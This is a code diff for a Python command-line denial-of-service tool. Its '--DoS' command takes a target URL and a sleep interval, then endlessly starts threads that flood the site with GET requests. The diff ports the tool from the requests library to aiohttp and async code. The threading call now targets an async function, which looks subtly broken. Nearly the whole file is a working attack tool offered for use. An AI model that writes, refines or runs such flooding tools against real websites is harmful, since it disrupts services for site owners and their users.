@@ -1,14 +1,13 @@
+from asyncio import run
 from datetime import datetime
+from enum import Enum
 from os import system
 from os.path import exists
 from threading import Thread
 from time import sleep
 from typing import Final
 
-from requests import get, RequestException, Response
-from requests.exceptions import InvalidURL
-
-from enum import Enum
+from aiohttp import ClientSession, ClientConnectionError, InvalidURL
 
 
 class Color(Enum):
@@ -63,85 +62,94 @@ print(f"{Color.PURPLE}{logo}")
 
 print(commands)
 
+site: str
 
-def dos():
+
+async def dos() -> None:
     """
     Executes a continuous loop that tries to make a GET request to a given site.
     """
     global site
-    while True:
-        try:
-            get(site)
-        except RequestException:
-            print(f"{Color.RED}PRESS Ctrl+V to out Request Error, object closed or your IP blocked, trying to connect...")
-            print(Color.STOP)
-
-
-while True:
-    match input(f"{Color.PURPLE}Enter command: >>> "):
-        case '--DoS':
+    async with ClientSession() as session:
+        while True:
             try:
-                r: Response = get("https://www.google.com/")
-                print(f"{Color.GREEN}Internet Connection is OK!")
-            except RequestException:
-                print(f"{Color.RED}[!]{Color.YELLOW}Connection Error!")
-                continue
+                await session.get(site)
+            except ClientConnectionError:
+                print(f"{Color.RED}PRESS Ctrl+V to out Request Error, object closed or your IP blocked, trying to connect...")
+                print(Color.STOP)
 
-            while True:
-                site: str = input(f"{Color.PURPLE}Enter site URL: >>>")
-                try:
-                    r: Response = get(site)
-                    print(f"{Color.GREEN}Connection to {site} is OK!")
-                    break
-                except InvalidURL:
-                    print(f"{Color.RED}[!]{Color.YELLOW} Invalid URL!")
 
-            print(Color.PURPLE)
-            while True:
-                try:
-                    if exists("components/settings/deftime.txt"):
-                        with open("components/settings/deftime.txt") as f:
-                            sleep_time: str | float = f.read()
-                        if input(f"{Color.PURPLE}Do you want to use set time sleep? (n/y): >>>") == "y":
-                            sleep_time = float(sleep_time)
-                            print(f"{Color.PURPLE}Set time: {sleep_time}")
+async def main() -> None:
+    global site
+    while True:
+        match input(f"{Color.PURPLE}Enter command: >>> "):
+            case '--DoS':
+                async with ClientSession() as session:
+                    try:
+                        await session.get("https://www.google.com/")
+                        print(f"{Color.GREEN}Internet Connection is OK!")
+                    except ClientConnectionError:
+                        print(f"{Color.RED}[!]{Color.YELLOW}Connection Error!")
+                        continue
+
+                    while True:
+                        site = input(f"{Color.PURPLE}Enter site URL: >>>")
+                        try:
+                            await session.get(site)
+                            print(f"{Color.GREEN}Connection to {site} is OK!")
+                            break
+                        except InvalidURL:
+                            print(f"{Color.RED}[!]{Color.YELLOW} Invalid URL!")
+
+                print(Color.PURPLE)
+                while True:
+                    try:
+                        if exists("components/settings/deftime.txt"):
+                            with open("components/settings/deftime.txt") as f:
+                                sleep_time: str | float = f.read()
+                            if input(f"{Color.PURPLE}Do you want to use set time sleep? (n/y): >>>") == "y":
+                                sleep_time = float(sleep_time)
+                                print(f"{Color.PURPLE}Set time: {sleep_time}")
+                                break
+
+                        sleep_time = float(input(f"{Color.PURPLE}Enter time sleep: >>>"))
+                        break
+                    except ValueError:
+                        print(f"{Color.RED}[!]{Color.YELLOW} Please, enter floatable number!")
+
+                print(Color.STOP)
+                print(f"{Color.GREEN}DoS successfully started to {site}")
+                print(Color.STOP)
+                while True:
+                    sleep(sleep_time)
+                    Thread(target=dos).start()
+
+            case '--help':
+                print(commands)
+
+            case '--settings':
+                print("This is a settings")
+                print(settings)
+                while True:
+                    match input(f"{Color.PURPLE}Enter setting: >>>"):
+                        case "def_time":
+                            try:
+                                sleep_time = input(f"{Color.PURPLE}Enter default time sleep: >>>")
+                                if sleep_time.startswith("ex"):
+                                    continue
+                                with open("components/settings/deftime.txt", "w") as f:
+                                    f.write(sleep_time)
+                                print(f"{Color.GREEN}[!] Successfully wrote default time sleep ({sleep_time})")
+                            except Exception as e:
+                                print(f"{Color.RED}[!]{Color.YELLOW} Error: {e}")
+                                continue
+
+                        case "exit":
+                            print("Exiting from settings!")
                             break
 
-                    sleep_time = float(input(f"{Color.PURPLE}Enter time sleep: >>>"))
-                    break
-                except ValueError:
-                    print(f"{Color.RED}[!]{Color.YELLOW} Please, enter floatable number!")
+            case _:
+                print(f"{Color.RED}[!]{Color.YELLOW} Error: undefined command!")
 
-            print(Color.STOP)
-            print(f"{Color.GREEN}DoS successfully started to {site}")
-            print(Color.STOP)
-            while True:
-                sleep(sleep_time)
-                Thread(target=dos).start()
-
-        case '--help':
-            print(commands)
-
-        case '--settings':
-            print("This is a settings")
-            print(settings)
-            while True:
-                match input(f"{Color.PURPLE}Enter setting: >>>"):
-                    case "def_time":
-                        try:
-                            sleep_time = input(f"{Color.PURPLE}Enter default time sleep: >>>")
-                            if sleep_time.startswith("ex"):
-                                continue
-                            with open("components/settings/deftime.txt", "w") as f:
-                                f.write(sleep_time)
-                            print(f"{Color.GREEN}[!] Successfully wrote default time sleep ({sleep_time})")
-                        except Exception as e:
-                            print(f"{Color.RED}[!]{Color.YELLOW} Error: {e}")
-                            continue
-
-                    case "exit":
-                        print("Exiting from settings!")
-                        break
-
-        case _:
-            print(f"{Color.RED}[!]{Color.YELLOW} Error: undefined command!")
+if __name__ == "__main__":
+    run(main())
